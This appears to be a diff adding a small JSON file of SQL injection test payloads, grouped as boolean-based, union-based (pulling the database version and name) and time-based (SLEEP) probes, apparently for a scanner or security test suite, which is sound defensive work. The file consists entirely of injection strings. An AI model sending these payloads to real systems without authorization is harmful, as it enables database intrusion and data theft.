@@ -1,0 +1,5 @@
+{
+    "boolean_based": ["1' AND '1'='1", "1' AND '1'='2"],
+    "union_based": ["1' UNION SELECT 1,2,3--", "1' UNION SELECT @@version,database()--"],
+    "time_based": ["1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"]
+  }
